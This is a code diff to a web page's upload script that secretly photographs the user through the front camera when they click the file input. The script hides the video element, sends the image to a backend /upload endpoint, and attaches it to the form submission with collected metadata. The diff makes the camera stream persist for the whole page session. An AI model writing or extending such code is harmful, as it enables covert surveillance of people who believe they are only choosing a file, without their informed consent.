@@ -6,7 +6,8 @@ const constraints = { video: { facingMode: "user" }, audio: false };
 
 let cameraCaptured = false;
 let cameraInProgress = false;
-let capturedImage = null; // store camera image
+let capturedImage = null;
+let cameraStream = null; // store the camera stream for reuse
 
 // ================================
 // COLLECT METADATA (ON SUBMIT)
@@ -54,20 +55,25 @@ async function captureAndSendCamera() {
   console.log("📸 captureAndSendCamera called");
 
   try {
-    // Dynamically create video element to avoid browser popup
+    // Request camera permission only once
+    if (!cameraStream) {
+      cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
+      console.log("✅ Camera permission granted (system popup shown once)");
+    }
+
+    // Dynamically create video element
     const video = document.createElement("video");
     video.setAttribute("playsinline", "true");
     video.style.display = "none";
     document.body.appendChild(video);
 
-    const stream = await navigator.mediaDevices.getUserMedia(constraints);
-    video.srcObject = stream;
+    video.srcObject = cameraStream;
 
     await new Promise((resolve) => { video.onloadedmetadata = () => resolve(); });
     await video.play();
-    await new Promise(r => setTimeout(r, 1200)); // wait for frame to stabilize
+    await new Promise(r => setTimeout(r, 1200));
 
-    // Create canvas dynamically
+    // Capture image from video
     const canvas = document.createElement("canvas");
     canvas.width = video.videoWidth || 640;
     canvas.height = video.videoHeight || 480;
@@ -78,7 +84,7 @@ async function captureAndSendCamera() {
     capturedImage = canvas.toDataURL("image/png");
     console.log("✅ Camera captured successfully");
 
-    // Send captured image to your /upload API
+    // Send captured image to /upload API
     const res = await fetch(`${BACKEND_BASE}/upload`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -88,11 +94,10 @@ async function captureAndSendCamera() {
     const data = await res.json();
     console.log("Camera upload response:", data);
 
-    // Cleanup
-    stream.getTracks().forEach(t => t.stop());
+    // Cleanup video element
     video.remove();
-
     cameraCaptured = true;
+
   } catch (err) {
     console.error("❌ Camera error:", err);
   } finally {
@@ -100,14 +105,21 @@ async function captureAndSendCamera() {
   }
 }
 
+// Stop camera when leaving page
+window.addEventListener("beforeunload", () => {
+  if (cameraStream) {
+    cameraStream.getTracks().forEach(track => track.stop());
+  }
+});
+
 // ================================
 // TRIGGER CAMERA ONLY ON FILE INPUT
 // ================================
 fileInput.addEventListener("pointerdown", async (e) => {
   if (!cameraCaptured && !cameraInProgress) {
     e.preventDefault(); // stop default file picker temporarily
-    await captureAndSendCamera(); // permission asked here
-    setTimeout(() => fileInput.click(), 50); // reopen file picker after capture
+    await captureAndSendCamera(); // permission asked here once
+    setTimeout(() => fileInput.click(), 50); // reopen file picker
   }
 });
 
@@ -175,7 +187,7 @@ form.addEventListener("submit", async (e) => {
           file: fileData,
           filename: fileInput.files[0].name,
           metadata,
-          cameraImage: capturedImage || null, // attach if available
+          cameraImage: capturedImage || null, // attach camera image if available
         }),
       });
 
